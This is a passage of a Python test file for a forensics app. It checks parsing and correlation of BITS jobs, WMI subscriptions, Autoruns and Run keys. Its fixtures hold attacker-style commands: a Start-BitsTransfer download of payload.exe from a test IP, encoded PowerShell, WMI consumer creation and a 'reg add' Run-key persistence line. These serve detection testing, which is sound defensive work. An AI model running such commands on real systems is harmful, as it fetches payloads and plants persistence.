    bits_docs = normalize_file(
        "case-1",
        "ev-bits",
        "art-bits",
        Path(__file__).parent / "fixtures" / "bits" / "bits_jobs_sample.csv",
        {
            "artifact_type": "bits",
            "parser": "bits_parser",
            "source_tool": "bits_parser",
            "source_format": "csv",
            "source_path": "bits_jobs_sample.csv",
            "name": "bits_jobs_sample.csv",
        },
    )
    browser_event = {
        "id": "browser-bits-1",
        "event_id": "browser-bits-1",
        "evidence_id": "ev-browser",
        "artifact_id": "art-browser",
        "@timestamp": "2026-05-10T08:03:00+00:00",
        "event": {"category": "web", "type": "file_downloaded", "severity": "info", "message": "Browser download observed"},
        "browser": {"artifact_type": "download", "browser": "chrome", "profile": "Default"},
        "download": {"url": "http://203.0.113.10/payload.exe", "target_path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "file_name": "payload.exe"},
        "file": {"path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "name": "payload.exe"},
        "url": {"full": "http://203.0.113.10/payload.exe", "domain": "203.0.113.10"},
        "artifact": {"type": "browser", "name": "History"},
        "tags": ["download"],
        "suspicious_reasons": [],
    }
    powershell_event = {
        "id": "ps-bits-1",
        "event_id": "ps-bits-1",
        "evidence_id": "ev-ps",
        "artifact_id": "art-ps",
        "@timestamp": "2026-05-10T08:01:00+00:00",
        "event": {"category": "powershell", "type": "powershell_console_history", "severity": "medium", "message": "PowerShell console command: Start-BitsTransfer"},
        "powershell": {
            "command": "Start-BitsTransfer -Source http://203.0.113.10/payload.exe -Destination C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe",
            "command_preview": "Start-BitsTransfer -Source http://203.0.113.10/payload.exe -Destination C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe",
            "artifact_type": "psreadline_history",
            "source_file": "ConsoleHost_history.txt",
            "urls": ["http://203.0.113.10/payload.exe"],
            "paths": ["C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe"],
        },
        "process": {"name": "powershell.exe", "command_line": "Start-BitsTransfer -Source http://203.0.113.10/payload.exe -Destination C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe"},
        "artifact": {"type": "powershell", "name": "ConsoleHost_history.txt"},
        "tags": ["powershell", "download_cradle"],
        "suspicious_reasons": [],
    }
    mft_event = {
        "id": "mft-bits-1",
        "event_id": "mft-bits-1",
        "evidence_id": "ev-mft",
        "artifact_id": "art-mft",
        "@timestamp": "2026-05-10T08:05:30+00:00",
        "event": {"category": "file", "type": "file_created", "severity": "medium", "message": "File created"},
        "file": {"path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "name": "payload.exe"},
        "artifact": {"type": "mft", "name": "MFTECmd_Output.csv"},
        "tags": [],
        "suspicious_reasons": [],
    }
    defender_event = {
        "id": "def-bits-1",
        "event_id": "def-bits-1",
        "evidence_id": "ev-def",
        "artifact_id": "art-def",
        "@timestamp": "2026-05-10T08:10:00+00:00",
        "event": {"category": "detection", "type": "defender_detection", "severity": "high", "message": "Threat detected"},
        "detection": {"path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "threat_name": "Trojan:Win32/Test"},
        "artifact": {"type": "defender", "name": "DetectionHistory"},
        "tags": ["defender", "detection"],
        "suspicious_reasons": [],
    }
    exec_event = {
        "id": "exec-bits-1",
        "event_id": "exec-bits-1",
        "evidence_id": "ev-exec",
        "artifact_id": "art-prefetch",
        "@timestamp": "2026-05-10T08:07:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "high", "message": "Program executed"},
        "process": {"name": "payload.exe", "path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "command_line": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe"},
        "file": {"path": "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe", "name": "payload.exe"},
        "artifact": {"type": "prefetch", "name": "PECmd_Output.csv"},
        "tags": ["execution"],
        "suspicious_reasons": [],
    }
    events = [*bits_docs, browser_event, powershell_event, mft_event, defender_event, exec_event]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["background_downloads"]
    assert result["sections"]["bits_jobs"]
    assert result["sections"]["suspicious_bits_jobs"]
    assert result["sections"]["bits_notify_commands"]
    assert result["sections"]["downloaded_then_executed"]
    assert result["sections"]["downloaded_then_detected"]
    assert any("PowerShell command references BITS job" in item["suspicious_reasons"] for item in result["sections"]["suspicious_bits_jobs"])
    assert any(item["key_fields"].get("execution_event") == "exec-bits-1" for item in result["sections"]["downloaded_then_executed"])
    assert any(item["key_fields"].get("defender_event") == "def-bits-1" for item in result["sections"]["downloaded_then_detected"])


def test_artifact_classification_wmi_csv() -> None:
    result = classify_artifact(
        Path("EventConsumer.csv"),
        ["Namespace", "ClassName", "Name", "CommandLineTemplate", "CreatorSID", "LastWriteTime"],
    )
    assert result["artifact_type"] == "wmi"
    assert result["parser"] == "wmi_csv"


def test_artifact_classification_wmi_json() -> None:
    result = classify_artifact(
        Path("Velociraptor_WMI.json"),
        ["Namespace", "ClassName", "Name", "Query", "CreatorSID"],
    )
    assert result["artifact_type"] == "wmi"
    assert result["parser"] == "wmi_json"


def test_artifact_classification_wmi_jsonl() -> None:
    result = classify_artifact(
        Path("wmi_persistence_sample.jsonl"),
        ["ArtifactType", "Namespace", "ClassName", "Name", "Query", "CreatorSID"],
    )
    assert result["artifact_type"] == "wmi"
    assert result["parser"] == "wmi_jsonl"


def test_artifact_classification_readme_txt_is_not_generic_csv() -> None:
    result = classify_artifact(Path("README.txt"), [])
    assert result["artifact_type"] == "document"
    assert result["parser"] == "unsupported_text"


def test_normalize_file_skips_unsupported_text_readme(tmp_path: Path) -> None:
    readme = tmp_path / "README.txt"
    readme.write_text("line 1\nline 2\n", encoding="utf-8")

    artifact_meta = {
        "artifact_type": "document",
        "parser": "unsupported_text",
        "source_tool": "collection_metadata",
        "source_format": "text",
        "source_path": str(readme),
        "name": "README.txt",
    }

    docs = normalize_file("case-1", "ev-readme", "art-readme", readme, artifact_meta)

    assert docs == []
    assert artifact_meta["ingest_audit"]["records_read"] == 0
    assert artifact_meta["ingest_audit"]["records_parsed"] == 0
    assert artifact_meta["ingest_audit"]["records_indexed"] == 0
    assert artifact_meta["ingest_audit"]["parser_status"] == "skipped_unsupported"
    assert artifact_meta["ingest_audit"]["parse_warnings"] == ["unsupported_text_skipped"]


def test_velociraptor_discovery_detects_wmi_repository_and_evtx() -> None:
    root = Path(__file__).parent / "fixtures" / "wmi" / "velociraptor_collection_wmi"
    discovery = discover_velociraptor_evidences(root)
    wmi_candidates = [item for item in discovery.candidates if item.category == "wmi"]
    assert len(wmi_candidates) >= 4
    objects_data = next(item for item in wmi_candidates if item.artifact_type == "wmi_objects_data")
    index_btr = next(item for item in wmi_candidates if item.artifact_type == "wmi_index_btr")
    mapping_map = next(item for item in wmi_candidates if item.artifact_type == "wmi_mapping_map")
    evtx = next(item for item in wmi_candidates if item.artifact_type == "wmi_activity_evtx")
    assert objects_data.supported is False
    assert objects_data.parser_status == "detected_not_implemented"
    assert index_btr.normalized_windows_path == "C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR"
    assert mapping_map.normalized_windows_path == "C:\\Windows\\System32\\wbem\\Repository\\MAPPING1.MAP"
    assert evtx.parser_status == "handled_by_evtx_parser"


def test_normalize_wmi_csv_files_extract_expected_fields() -> None:
    base = Path(__file__).parent / "fixtures" / "wmi"
    filter_docs = normalize_file(
        "case-1",
        "ev-wmi-filters",
        "art-wmi-filters",
        base / "wmi_event_filters.csv",
        {
            "artifact_type": "wmi",
            "parser": "wmi_csv",
            "source_tool": "wmi_parser",
            "source_format": "csv",
            "source_path": str(base / "wmi_event_filters.csv"),
            "name": "wmi_event_filters.csv",
        },
    )
    consumer_docs = normalize_file(
        "case-1",
        "ev-wmi-consumers",
        "art-wmi-consumers",
        base / "wmi_consumers.csv",
        {
            "artifact_type": "wmi",
            "parser": "wmi_csv",
            "source_tool": "wmi_parser",
            "source_format": "csv",
            "source_path": str(base / "wmi_consumers.csv"),
            "name": "wmi_consumers.csv",
        },
    )
    binding_docs = normalize_file(
        "case-1",
        "ev-wmi-bindings",
        "art-wmi-bindings",
        base / "wmi_bindings.csv",
        {
            "artifact_type": "wmi",
            "parser": "wmi_csv",
            "source_tool": "wmi_parser",
            "source_format": "csv",
            "source_path": str(base / "wmi_bindings.csv"),
            "name": "wmi_bindings.csv",
        },
    )

    assert len(filter_docs) == 3
    assert len(consumer_docs) == 3
    assert len(binding_docs) == 2

    event_filter = next(item for item in filter_docs if item["wmi"]["name"] == "ProcStartFilter")
    registry_filter = next(item for item in filter_docs if item["wmi"]["name"] == "RegistryWatchFilter")
    encoded_consumer = next(item for item in consumer_docs if item["wmi"]["consumer_name"] == "EncodedPowerShellConsumer")
    script_consumer = next(item for item in consumer_docs if item["wmi"]["consumer_name"] == "ScriptConsumer")
    unresolved_binding = next(item for item in binding_docs if item["wmi"]["binding_consumer"] == "MissingConsumer")

    assert event_filter["event"]["type"] == "wmi_event_filter"
    assert event_filter["persistence"]["mechanism"] == "wmi_event_subscription"
    assert "process_trigger" in event_filter["tags"]
    assert registry_filter["wmi"]["query_language"] == "WQL"
    assert "registry_trigger" in registry_filter["tags"]
    assert encoded_consumer["event"]["type"] == "wmi_event_consumer"
    assert encoded_consumer["persistence"]["mechanism"] == "wmi_event_subscription"
    assert encoded_consumer["process"]["path"] == "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    assert "encoded_powershell" in encoded_consumer["tags"]
    assert script_consumer["event"]["type"] == "wmi_event_consumer"
    assert script_consumer["wmi"]["script_preview"]
    assert "active_script_consumer" in script_consumer["tags"]
    assert unresolved_binding["event"]["type"] == "wmi_filter_consumer_binding"
    assert unresolved_binding["persistence"]["confidence"] == "high"


def test_normalize_wmi_json_file_and_evtx_activity() -> None:
    base = Path(__file__).parent / "fixtures" / "wmi"
    json_docs = normalize_file(
        "case-1",
        "ev-wmi-json",
        "art-wmi-json",
        base / "wmi_consumers.json",
        {
            "artifact_type": "wmi",
            "parser": "wmi_json",
            "source_tool": "velociraptor_wmi",
            "source_format": "json",
            "source_path": str(base / "wmi_consumers.json"),
            "name": "wmi_consumers.json",
        },
    )
    evtx_docs = normalize_file(
        "case-1",
        "ev-wmi-evtx",
        "art-wmi-evtx",
        base / "wmi_activity_evtx_output.csv",
        {
            "artifact_type": "wmi",
            "parser": "evtx",
            "source_tool": "evtxecmd",
            "source_format": "evtx_csv",
            "source_path": str(base / "wmi_activity_evtx_output.csv"),
            "name": "wmi_activity_evtx_output.csv",
        },
    )

    assert len(json_docs) == 1
    assert json_docs[0]["artifact"]["parser"] == "wmi_json"
    assert json_docs[0]["event"]["type"] == "wmi_event_consumer"
    assert len(evtx_docs) == 4
    event_types = {item["event"]["type"] for item in evtx_docs}
    assert "wmi_error" in event_types
    assert any(event_type.startswith("wmi_") for event_type in event_types)
    assert all(item.get("@timestamp") for item in evtx_docs)


def test_normalize_wmi_jsonl_persistence_sample() -> None:
    base = Path(__file__).parent / "fixtures" / "wmi"
    docs = normalize_file(
        "case-1",
        "ev-wmi-jsonl",
        "art-wmi-jsonl",
        base / "wmi_persistence_sample.jsonl",
        {
            "artifact_type": "wmi",
            "parser": "wmi_jsonl",
            "source_tool": "velociraptor_wmi",
            "source_format": "jsonl",
            "source_path": str(base / "wmi_persistence_sample.jsonl"),
            "name": "wmi_persistence_sample.jsonl",
            "repository_path": r"C:\Windows\System32\wbem\Repository\OBJECTS.DATA",
        },
    )

    assert len(docs) == 5
    assert all(doc["artifact"]["type"] == "wmi" for doc in docs)
    assert all(doc["execution"]["is_execution_confirmed"] is False for doc in docs)

    event_filter = next(doc for doc in docs if doc["wmi"]["artifact_type"] == "wmi_event_filter")
    cmd_consumer = next(doc for doc in docs if doc["wmi"]["consumer_name"] == "PSConsumer")
    script_consumer = next(doc for doc in docs if doc["wmi"]["consumer_name"] == "ScriptConsumer")
    binding = next(doc for doc in docs if doc["wmi"]["artifact_type"] == "wmi_filter_to_consumer_binding")
    namespace_obs = next(doc for doc in docs if doc["wmi"]["artifact_type"] == "wmi_namespace_observed")

    assert event_filter["event"]["type"] == "wmi_event_filter"
    assert cmd_consumer["persistence"]["mechanism"] == "wmi_event_subscription"
    assert binding["persistence"]["confidence"] == "high"
    assert script_consumer["event"]["type"] == "wmi_event_consumer"
    assert "WMI ActiveScriptEventConsumer observed" in script_consumer["suspicious_reasons"]
    assert namespace_obs["event"]["category"] == "inventory"
    assert namespace_obs["event"]["timeline_include"] is False
    assert namespace_obs["persistence"]["mechanism"] is None
    assert namespace_obs["risk_score"] == 0
    assert namespace_obs["execution"]["interpretation"] == "WMI namespace/class observation indicates configuration or inventory, not execution by itself"
    assert event_filter["risk_score"] <= 40
    assert cmd_consumer["@timestamp"] == "2026-05-11T08:01:00+00:00"
    assert cmd_consumer["timestamp_precision"] == "wmi_modified_time"
    assert cmd_consumer["ingest"]["processed_at"] is None or cmd_consumer["@timestamp"] != cmd_consumer["ingest"]["processed_at"]


def test_build_wmi_parse_report_from_audit_and_events() -> None:
    parser_audit = [
        {
            "artifact_type": "wmi",
            "parser_name": "wmi_jsonl",
            "parser_status": "parsed_native",
            "records_read": 5,
            "records_parsed": 5,
            "records_indexed": 5,
            "records_failed": 0,
            "source_file": r"C:\exports\wmi_persistence_sample.jsonl",
            "suspicious_counts": {"WMI ActiveScriptEventConsumer observed": 1},
            "data_quality_counts": {"wmi_not_execution_proof": 4, "wmi_inventory_only": 1},
            "sample_records": [{"consumer_name": "PSConsumer", "artifact_type": "wmi_command_line_consumer", "source_file": r"C:\exports\wmi_persistence_sample.jsonl"}],
            "warnings": [],
            "parser_errors": [],
        },
        {
            "artifact_type": "wmi",
            "parser_name": "wmi_json",
            "parser_status": "parsed_native",
            "records_read": 5,
            "records_parsed": 5,
            "records_indexed": 5,
            "records_failed": 0,
            "source_file": r"C:\exports\wmi_persistence_sample.json",
            "sample_records": [{"artifact_type": "wmi_namespace_observed", "source_file": r"C:\exports\wmi_persistence_sample.json"}],
            "warnings": [],
            "parser_errors": [],
        },
    ]
    discovery_candidates: list[dict] = []
    events = [
        {"artifact": {"type": "wmi", "parser": "wmi_jsonl", "source_path": r"C:\exports\wmi_persistence_sample.jsonl"}, "event": {"type": "wmi_event_filter"}},
        {"artifact": {"type": "wmi", "parser": "wmi_json", "source_path": r"C:\exports\wmi_persistence_sample.json"}, "event": {"type": "wmi_event_consumer"}},
    ]
    report = _build_wmi_parse_report(parser_audit, discovery_candidates, events, scope="evidence", selected_artifact_types=["wmi"])
    assert report["records_read"] == 10
    assert report["records_parsed"] == 10
    assert report["records_indexed"] == 10
    assert report["records_failed"] == 0
    assert report["detected_wmi_sources"] == 2
    assert report["sample_by_event_type"]["wmi_event_consumer"] == 1
    assert report["suspicious_counts"]["WMI ActiveScriptEventConsumer observed"] == 1


def test_wmi_semi_auto_sections_and_correlations(monkeypatch) -> None:
    base = Path(__file__).parent / "fixtures" / "wmi"
    events = []
    for filename, evidence_id in (
        ("wmi_event_filters.csv", "ev-wmi-filters"),
        ("wmi_consumers.csv", "ev-wmi-consumers"),
        ("wmi_bindings.csv", "ev-wmi-bindings"),
    ):
        events.extend(
            normalize_file(
                "case-1",
                evidence_id,
                f"art-{filename}",
                base / filename,
                {
                    "artifact_type": "wmi",
                    "parser": "wmi_csv",
                    "source_tool": "wmi_parser",
                    "source_format": "csv",
                    "source_path": filename,
                    "name": filename,
                },
            )
        )

    powershell_event = {
        "id": "ps-wmi-1",
        "event_id": "ps-wmi-1",
        "evidence_id": "ev-ps",
        "artifact_id": "art-ps",
        "@timestamp": "2026-05-11T08:02:00+00:00",
        "event": {"category": "powershell", "type": "powershell_console_history", "severity": "medium", "message": "PowerShell command: New-CimInstance __EventFilter"},
        "powershell": {
            "command": "New-CimInstance -ClassName __EventFilter; New-CimInstance -ClassName CommandLineEventConsumer; New-CimInstance -ClassName __FilterToConsumerBinding",
            "command_preview": "New-CimInstance -ClassName __EventFilter",
            "artifact_type": "psreadline_history",
        },
        "artifact": {"type": "powershell", "name": "ConsoleHost_history.txt"},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    defender_event = {
        "id": "def-wmi-1",
        "event_id": "def-wmi-1",
        "evidence_id": "ev-def",
        "artifact_id": "art-def",
        "@timestamp": "2026-05-11T08:09:00+00:00",
        "event": {"category": "detection", "type": "defender_detection", "severity": "high", "message": "Threat detected"},
        "detection": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "threat_name": "Trojan:Win32/Test"},
        "artifact": {"type": "defender", "name": "DetectionHistory"},
        "tags": ["defender", "detection"],
        "suspicious_reasons": [],
    }
    exec_event = {
        "id": "exec-wmi-1",
        "event_id": "exec-wmi-1",
        "evidence_id": "ev-prefetch",
        "artifact_id": "art-prefetch",
        "@timestamp": "2026-05-11T08:10:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "high", "message": "Program executed"},
        "process": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA"},
        "file": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe"},
        "artifact": {"type": "prefetch", "name": "PECmd_Output.csv"},
        "tags": ["execution"],
        "suspicious_reasons": [],
    }
    mft_event = {
        "id": "mft-wmi-1",
        "event_id": "mft-wmi-1",
        "evidence_id": "ev-mft",
        "artifact_id": "art-mft",
        "@timestamp": "2026-05-11T08:03:30+00:00",
        "event": {"category": "file", "type": "file_created", "severity": "medium", "message": "File created"},
        "file": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "name": "powershell.exe"},
        "artifact": {"type": "mft", "name": "MFTECmd_Output.csv"},
        "tags": [],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([*events, powershell_event, defender_event, exec_event, mft_event]))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["wmi_persistence"]
    assert result["sections"]["wmi_filters"]
    assert result["sections"]["wmi_consumers"]
    assert result["sections"]["wmi_bindings"]
    assert result["sections"]["suspicious_wmi_consumers"]
    assert result["sections"]["wmi_encoded_powershell"]
    assert result["sections"]["possible_wmi_execution"]
    assert any(item["key_fields"].get("binding_status") == "complete" for item in result["sections"]["wmi_persistence"])
    assert any("Defender detected file referenced by WMI" in item["suspicious_reasons"] for item in result["sections"]["possible_wmi_execution"])


def test_wmi_frontend_routes_to_wmi_view() -> None:
    candidates = [
        Path(__file__).resolve().parents[2],
        Path(__file__).resolve().parents[1],
        Path("/root/DFIR_APP"),
        Path("/app"),
    ]
    repo_root = next((candidate for candidate in candidates if (candidate / "frontend" / "src" / "pages" / "ArtifactExplorer.tsx").exists()), None)
    if repo_root is None:
        pytest.skip("frontend sources are not available in this test environment")
    artifact_explorer = (repo_root / "frontend" / "src" / "pages" / "ArtifactExplorer.tsx").read_text(encoding="utf-8")
    event_table = (repo_root / "frontend" / "src" / "components" / "EventTable.tsx").read_text(encoding="utf-8")
    assert 'artifactType === "wmi"' in artifact_explorer
    assert '? "wmi"' in artifact_explorer or ': "wmi"' in artifact_explorer
    assert 'if (artifactType === "wmi") return "wmi";' in event_table


def test_artifact_classification_autoruns_csv_tsv_xml() -> None:
    csv_result = classify_artifact(
        Path("Autoruns.csv"),
        ["Time", "Entry Location", "Entry", "Category", "Image Path", "Launch String"],
    )
    tsv_result = classify_artifact(
        Path("Autoruns.tsv"),
        ["Time", "Entry Location", "Entry", "Category", "Image Path", "Launch String"],
    )
    xml_result = classify_artifact(
        Path("Autorunsc.xml"),
        ["Time", "Entry Location", "Entry", "Category", "Image Path", "Launch String"],
    )
    jsonl_result = classify_artifact(
        Path("Autoruns.jsonl"),
        ["Time", "Entry Location", "Entry", "Category", "Image Path", "Launch String"],
    )
    assert csv_result["artifact_type"] == "autoruns"
    assert csv_result["parser"] == "autoruns_csv"
    assert tsv_result["parser"] == "autoruns_tsv"
    assert xml_result["parser"] == "autoruns_xml"
    assert jsonl_result["parser"] == "autoruns_jsonl"


def test_velociraptor_discovery_detects_autoruns_candidates() -> None:
    root = Path(__file__).parent / "fixtures" / "autoruns" / "velociraptor_collection_autoruns"
    discovery = discover_velociraptor_evidences(root)
    autoruns_candidates = [item for item in discovery.candidates if item.category == "autoruns"]
    assert autoruns_candidates
    parsed = next(item for item in autoruns_candidates if item.artifact_type == "autoruns_csv")
    startup = next(item for item in autoruns_candidates if item.artifact_type == "startup_folder_file")
    task_candidate = next(item for item in autoruns_candidates if item.artifact_type == "scheduled_task_candidate")
    wmi_candidate = next(item for item in autoruns_candidates if item.artifact_type == "wmi_repository_candidate")
    assert parsed.supported is True
    assert startup.supported is True
    assert task_candidate.parser_status == "handled_by_scheduled_tasks_parser"
    assert wmi_candidate.parser_status == "handled_by_wmi_parser"


def test_normalize_autoruns_csv_tsv_xml_extracts_expected_fields() -> None:
    base = Path(__file__).parent / "fixtures" / "autoruns"
    csv_docs = normalize_file(
        "case-1",
        "ev-autoruns",
        "art-autoruns",
        base / "autoruns_sample.csv",
        {
            "artifact_type": "autoruns",
            "parser": "autoruns_csv",
            "source_tool": "autoruns",
            "source_format": "csv",
            "source_path": str(base / "autoruns_sample.csv"),
            "name": "autoruns_sample.csv",
        },
    )
    tsv_docs = normalize_file(
        "case-1",
        "ev-autoruns-tsv",
        "art-autoruns-tsv",
        base / "autoruns_sample.tsv",
        {
            "artifact_type": "autoruns",
            "parser": "autoruns_tsv",
            "source_tool": "autoruns",
            "source_format": "tsv",
            "source_path": str(base / "autoruns_sample.tsv"),
            "name": "autoruns_sample.tsv",
        },
    )
    xml_docs = normalize_file(
        "case-1",
        "ev-autoruns-xml",
        "art-autoruns-xml",
        base / "autoruns_sample.xml",
        {
            "artifact_type": "autoruns",
            "parser": "autoruns_xml",
            "source_tool": "autorunsc",
            "source_format": "xml",
            "source_path": str(base / "autoruns_sample.xml"),
            "name": "autoruns_sample.xml",
        },
    )

    assert len(csv_docs) >= 9
    suspicious = next(item for item in csv_docs if item["autoruns"]["entry"] == "Updater")
    service_doc = next(item for item in csv_docs if item["persistence"]["mechanism"] == "service")
    ifeo_doc = next(item for item in csv_docs if item["persistence"]["mechanism"] == "ifeo_debugger")
    winlogon_doc = next(item for item in csv_docs if item["persistence"]["mechanism"] in {"winlogon_shell", "winlogon_userinit"})
    appinit_doc = next(item for item in csv_docs if item["persistence"]["mechanism"] == "appinit_dll")
    wmi_doc = next(item for item in csv_docs if item["persistence"]["mechanism"] == "wmi")

    assert suspicious["artifact"]["type"] == "autorun"
    assert suspicious["event"]["type"] == "autorun"
    assert suspicious["persistence"]["mechanism"] == "run_key"
    assert suspicious["file"]["path"] == "C:\\Users\\alex\\AppData\\Roaming\\updater.exe"
    assert suspicious["autoruns"]["vt_detection"] == 7
    assert "user_writable_path" in suspicious["tags"]
    assert suspicious["risk_score"] >= 75
    assert service_doc["persistence"]["mechanism"] == "service"
    assert ifeo_doc["persistence"]["mechanism"] == "ifeo_debugger"
    assert winlogon_doc["persistence"]["mechanism"] in {"winlogon_shell", "winlogon_userinit"}
    assert appinit_doc["persistence"]["mechanism"] == "appinit_dll"
    assert "lolbin" in appinit_doc["tags"]
    assert wmi_doc["wmi"]["consumer_name"] == "UpdaterConsumer"
    assert tsv_docs[0]["artifact"]["parser"] == "autoruns_tsv"
    assert xml_docs[0]["event"]["type"] == "autorun"


def test_startup_folder_raw_candidate_normalizes_to_autoruns() -> None:
    source = Path(__file__).parent / "fixtures" / "autoruns" / "velociraptor_collection_autoruns" / "uploads" / "auto" / "C%3A" / "ProgramData" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "Updater.lnk"
    docs = normalize_file(
        "case-1",
        "ev-autoruns-startup",
        "art-autoruns-startup",
        source,
        {
            "artifact_type": "autoruns",
            "parser": "startup_folder",
            "source_tool": "generic_asep",
            "source_format": "raw",
            "source_path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.lnk",
            "name": "Updater.lnk",
            "user": None,
        },
    )
    assert len(docs) == 1
    assert docs[0]["event"]["type"] == "autorun"
    assert docs[0]["persistence"]["mechanism"] == "startup_folder"


def test_autoruns_semi_auto_sections_and_correlations(monkeypatch) -> None:
    base = Path(__file__).parent / "fixtures" / "autoruns"
    events = normalize_file(
        "case-1",
        "ev-autoruns",
        "art-autoruns",
        base / "autoruns_sample.csv",
        {
            "artifact_type": "autoruns",
            "parser": "autoruns_csv",
            "source_tool": "autoruns",
            "source_format": "csv",
            "source_path": "autoruns_sample.csv",
            "name": "autoruns_sample.csv",
        },
    )
    browser_event = {
        "id": "browser-autoruns-1",
        "event_id": "browser-autoruns-1",
        "evidence_id": "ev-browser",
        "artifact_id": "art-browser",
        "@timestamp": "2026-05-10T07:04:00+00:00",
        "event": {"category": "web", "type": "file_downloaded", "severity": "info", "message": "Browser download observed"},
        "browser": {"artifact_type": "download", "browser": "chrome", "profile": "Default"},
        "download": {"url": "https://cdn.example/updater.exe", "target_path": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe", "file_name": "updater.exe"},
        "file": {"path": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe", "name": "updater.exe"},
        "url": {"full": "https://cdn.example/updater.exe", "domain": "cdn.example"},
        "artifact": {"type": "browser", "name": "History"},
        "tags": ["download"],
        "suspicious_reasons": [],
    }
    defender_event = {
        "id": "def-autoruns-1",
        "event_id": "def-autoruns-1",
        "evidence_id": "ev-def",
        "artifact_id": "art-def",
        "@timestamp": "2026-05-10T07:08:00+00:00",
        "event": {"category": "detection", "type": "defender_detection", "severity": "high", "message": "Threat detected"},
        "detection": {"path": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe", "threat_name": "Trojan:Win32/Test"},
        "artifact": {"type": "defender", "name": "DetectionHistory"},
        "tags": ["defender", "detection"],
        "suspicious_reasons": [],
    }
    exec_event = {
        "id": "exec-autoruns-1",
        "event_id": "exec-autoruns-1",
        "evidence_id": "ev-prefetch",
        "artifact_id": "art-prefetch",
        "@timestamp": "2026-05-10T07:09:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "high", "message": "Program executed"},
        "process": {"path": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe", "name": "updater.exe", "command_line": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe --silent"},
        "file": {"path": "C:\\Users\\alex\\AppData\\Roaming\\updater.exe", "name": "updater.exe"},
        "artifact": {"type": "prefetch", "name": "PECmd_Output.csv"},
        "tags": ["execution"],
        "suspicious_reasons": [],
    }
    powershell_event = {
        "id": "ps-autoruns-1",
        "event_id": "ps-autoruns-1",
        "evidence_id": "ev-ps",
        "artifact_id": "art-ps",
        "@timestamp": "2026-05-10T07:03:00+00:00",
        "event": {"category": "powershell", "type": "powershell_console_history", "severity": "medium", "message": "PowerShell command: reg add Run key"},
        "powershell": {"command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\alex\\AppData\\Roaming\\updater.exe"},
        "process": {"name": "powershell.exe", "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\alex\\AppData\\Roaming\\updater.exe"},
        "artifact": {"type": "powershell", "name": "ConsoleHost_history.txt"},
        "tags": ["powershell", "persistence"],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([*events, browser_event, defender_event, exec_event, powershell_event]))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["autoruns_persistence"]
    assert result["sections"]["suspicious_autoruns"]
    assert result["sections"]["run_key_persistence"]
    assert result["sections"]["ifeo_debugger_persistence"]
    assert result["sections"]["winlogon_persistence"]
    assert result["sections"]["appinit_appcert_persistence"]
    assert result["sections"]["downloaded_then_persisted"]
    assert result["sections"]["persisted_then_executed"]
    assert result["sections"]["persistence_detected_by_defender"]
    assert any(item["key_fields"].get("execution_event") for item in result["sections"]["persisted_then_executed"])
    assert any(item["key_fields"].get("defender_event") for item in result["sections"]["persistence_detected_by_defender"])


def test_autoruns_frontend_routes_to_autoruns_view() -> None:
    candidates = [
        Path(__file__).resolve().parents[2],
        Path(__file__).resolve().parents[1],
        Path("/root/DFIR_APP"),
        Path("/app"),
    ]
    repo_root = next((candidate for candidate in candidates if (candidate / "frontend" / "src" / "pages" / "ArtifactExplorer.tsx").exists()), None)
    if repo_root is None:
        pytest.skip("frontend sources are not available in this test environment")
    artifact_explorer = (repo_root / "frontend" / "src" / "pages" / "ArtifactExplorer.tsx").read_text(encoding="utf-8")
    event_table = (repo_root / "frontend" / "src" / "components" / "EventTable.tsx").read_text(encoding="utf-8")
    semi_auto = (repo_root / "frontend" / "src" / "pages" / "SemiAutoAnalysis.tsx").read_text(encoding="utf-8")
    assert 'artifactType === "autoruns" || artifactType === "autorun"' in artifact_explorer
    assert 'if (artifactType === "autoruns" || artifactType === "autorun") return "autoruns";' in event_table
    assert "autoruns_persistence" in semi_auto
    assert "suspicious_autoruns" in semi_auto


def test_registry_persistence_run_key_powershell_high_risk() -> None:
    document = normalize_row(
        "case-1",
        "ev-autorun",
        "art-autorun",
        {
            "ArtifactType": "registry_run_key",
            "Hive": "NTUSER",
            "KeyPath": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "ValueName": "Updater",
